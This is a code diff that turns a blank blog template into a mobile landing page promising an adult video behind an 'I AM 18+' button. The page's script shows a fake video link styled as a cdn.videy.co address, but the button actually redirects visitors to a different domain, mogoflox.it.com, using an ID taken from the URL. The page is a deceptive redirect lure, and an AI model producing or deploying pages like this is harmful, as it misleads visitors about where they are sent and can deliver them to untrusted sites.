@@ -1,56 +1,157 @@
 <!DOCTYPE html>
 <html lang="id">
 <head>
-<meta charset="UTF-8">
-<title>Blog Saya</title>
-<style>
-  body { font-family: Arial, sans-serif; margin:0; padding:0; background:#f9f9f9; }
-  .header { background:#222; color:white; padding:20px; text-align:center; }
-  .main { display:flex; max-width: 1024px; margin:auto; padding:20px; }
-  .posts { flex:2; padding-right:20px; }
-  .post { background:white; margin-bottom:20px; padding:15px; border-radius:8px; }
-  .sidebar { flex:1; background:white; padding:15px; border-radius:8px; }
-  .footer { text-align:center; padding:10px; background:#222; color:white; margin-top:20px; }
-</style>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>Ｍｏｇｏｆｌｏｘ - Konfirmasi</title>
+    <style>
+        * { 
+            box-sizing: border-box; 
+            -webkit-tap-highlight-color: transparent; 
+            font-family: Arial, sans-serif;
+        }
+        
+        body { 
+            background-color: #f0f2f5; 
+            margin: 0; 
+            display: flex; 
+            align-items: center; 
+            justify-content: center; 
+            height: 100vh;
+        }
+
+        /* Container Kartu Putih */
+        .card {
+            background: #ffffff;
+            width: 90%;
+            max-width: 400px;
+            padding: 25px;
+            border-radius: 15px;
+            box-shadow: 0 4px 20px rgba(0,0,0,0.08);
+            text-align: center;
+        }
+
+        /* Teks Judul */
+        .card h2 {
+            font-size: 18px;
+            color: #333;
+            margin-bottom: 20px;
+            font-weight: bold;
+        }
+
+        /* Kotak Hitam Tautan */
+        .link-box {
+            background-color: #2c2f33;
+            color: #ffffff;
+            padding: 12px;
+            border-radius: 8px;
+            font-size: 14px;
+            font-weight: bold;
+            word-break: break-all;
+            margin-bottom: 25px;
+            display: block;
+            text-decoration: none;
+        }
+
+        /* Grup Tombol */
+        .btn-group {
+            display: flex;
+            gap: 10px;
+            justify-content: center;
+        }
+
+        /* Gaya Tombol Umum */
+        .btn {
+            flex: 1;
+            padding: 12px;
+            border: none;
+            border-radius: 8px;
+            font-size: 18px;
+            font-weight: bold;
+            color: white;
+            cursor: pointer;
+            text-transform: uppercase;
+            transition: opacity 0.2s;
+        }
+
+        .btn:active {
+            opacity: 0.8;
+        }
+
+        /* Animasi Berkedip/Pulse */
+        @keyframes pulse-animation {
+            0% { transform: scale(1); }
+            50% { transform: scale(1.05); }
+            100% { transform: scale(1); }
+        }
+
+        /* Tombol Hijau dengan Animasi */
+        .btn-green {
+            background-color: #28a745;
+            animation: pulse-animation 1.5s infinite ease-in-out;
+        }
+
+        /* Tombol Merah */
+        .btn-red {
+            background-color: #dc3545;
+        }
+    </style>
 </head>
 <body>
 
-<div class="header">
-  <h1>Judul Blog Kamu</h1>
-  <p>Deskripsi singkat atau slogan blog</p>
-</div>
+    <div class="card">
+        <h2>Click Link to Watch</h2>
+        
+        <!-- Menampilkan Link Video Secara Dinamis -->
+        <div id="videoLinkDisplay" class="link-box">
+            https://cdn.videy.co/loading...
+        </div>
 
-<div class="main">
-  <div class="posts">
-    <div class="post">
-      <h2>Postingan Pertama</h2>
-      <p><small>20 Januari 2026</small></p>
-      <p>Ini adalah konten pertama blog kamu. Kamu bisa ganti tulisan ini sesuai yang kamu mau.</p>
-      <a href="#">Read more →</a>
+        <div class="btn-group">
+            <button class="btn btn-green" onclick="proceedToVideo()">I AM 18+</button>
+            <button class="btn btn-red" onclick="exitPage()">EXIT</button>
+        </div>
     </div>
 
-    <div class="post">
-      <h2>Postingan Kedua</h2>
-      <p><small>21 Januari 2026</small></p>
-      <p>Tambah postingan lagi di bawah ini dengan struktur yang sama.</p>
-      <a href="#">Read more →</a>
-    </div>
-  </div>
+    <script>
+        // Mengambil ID dari URL (?id=abc)
+        const urlParams = new URLSearchParams(window.location.search);
+        let videoId = urlParams.get('id');
 
-  <div class="sidebar">
-    <h3>Tentang Saya</h3>
-    <p>Tulis sedikit tentang diri kamu.</p>
-    <h3>Arsip</h3>
-    <ul>
-      <li>Januari 2026</li>
-      <li>Desember 2025</li>
-    </ul>
-  </div>
-</div>
+        // Jika tidak ada ID di URL, coba ambil dari path (seperti contoh vid-x)
+        if (!videoId) {
+            const pathParts = window.location.pathname.split('/');
+            // Mencari bagian yang mengandung .mp4 atau ID acak
+            const lastPart = pathParts[pathParts.length - 1];
+            if (lastPart && lastPart !== 'index.html' && lastPart !== '') {
+                videoId = lastPart.replace('.mp4', '');
+            }
+        }
 
-<div class="footer">
-  © 2026 Blog Kamu
-</div>
+        // Default jika ID tetap kosong
+        if (!videoId) videoId = 'aa9cb8b7';
 
+        // Konfigurasi Domain Tujuan
+        const targetDomain = "https://mogoflox.it.com/";
+        const finalRedirectLink = targetDomain + videoId;
+        
+        // Tautan CDN untuk tampilan di kotak hitam (sesuai gambar)
+        const cdnDisplayLink = `https://cdn.videy.co/${videoId}.mp4`;
+
+        // Tampilkan link di kotak hitam saat halaman dimuat
+        document.getElementById('videoLinkDisplay').innerText = cdnDisplayLink;
+
+        function proceedToVideo() {
+            window.location.href = finalRedirectLink;
+        }
+
+        function exitPage() {
+            if (window.history.length > 1) {
+                window.history.back();
+            } else {
+                window.location.href = "https://www.google.com";
+            }
+        }
+    </script>
 </body>
 </html>
